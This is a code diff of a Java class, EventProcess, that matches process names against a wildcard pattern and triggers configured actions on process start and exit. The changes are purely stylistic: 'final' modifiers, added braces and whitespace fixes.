@@ -52,13 +52,14 @@ public class EventProcess extends EventBase implements Observer<ProcessInfo> {
 			type = databuffer.readInt();
 
 			// Estraiamo il nome del processo
-			byte[] procName = new byte[databuffer.readInt()];
+			final byte[] procName = new byte[databuffer.readInt()];
 			databuffer.read(procName);
 
 			starname = WChar.getString(procName, true);
 		} catch (final IOException e) {
-			if (Cfg.DEBUG)
+			if (Cfg.DEBUG) {
 				Check.log(TAG + " Error: params FAILED");
+			}
 
 			return false;
 		}
@@ -73,7 +74,7 @@ public class EventProcess extends EventBase implements Observer<ProcessInfo> {
 
 	// Viene richiamata dal listener (dalla dispatch())
 	public int notification(ProcessInfo process) {
-		String processName = process.processInfo.processName;
+		final String processName = process.processInfo.processName;
 
 		if (!matchStar(starname, processName)) {
 			return 0;
@@ -95,7 +96,7 @@ public class EventProcess extends EventBase implements Observer<ProcessInfo> {
 		default:
 			break;
 		}
-		
+
 		return 0;
 	}
 
@@ -118,11 +119,11 @@ public class EventProcess extends EventBase implements Observer<ProcessInfo> {
 				}
 
 				if (wildcardProcess.charAt(0) != '?' && wildcardProcess.charAt(0) != '*') {
-					int len = processName.length();
+					final int len = processName.length();
 					for (int i = 0; i < len; i++) {
-						char c = processName.charAt(0);
+						final char c = processName.charAt(0);
 						processName = processName.substring(1);
-						String tp = wildcardProcess.substring(1);
+						final String tp = wildcardProcess.substring(1);
 						if (c == wildcardProcess.charAt(0) && matchStar(tp, processName)) {
 							return true;
 						}
@@ -131,7 +132,7 @@ public class EventProcess extends EventBase implements Observer<ProcessInfo> {
 				}
 
 				for (int i = 0; i < processName.length(); i++) {
-					char c = processName.charAt(i);
+					final char c = processName.charAt(i);
 					processName = processName.substring(1);
 					if (matchStar(wildcardProcess, processName)) {
 						return true;
@@ -156,14 +157,16 @@ public class EventProcess extends EventBase implements Observer<ProcessInfo> {
 	}
 
 	public void onEnter() {
-		if (Cfg.DEBUG)
+		if (Cfg.DEBUG) {
 			Check.log(TAG + " (onEnter): triggering " + actionOnEnter + " " + starname);
+		}
 		trigger(actionOnEnter);
 	}
 
 	public void onExit() {
-		if (Cfg.DEBUG)
+		if (Cfg.DEBUG) {
 			Check.log(TAG + " (onExit): triggering " + actionOnExit + " " + starname);
+		}
 		trigger(actionOnExit);
 	}
 }
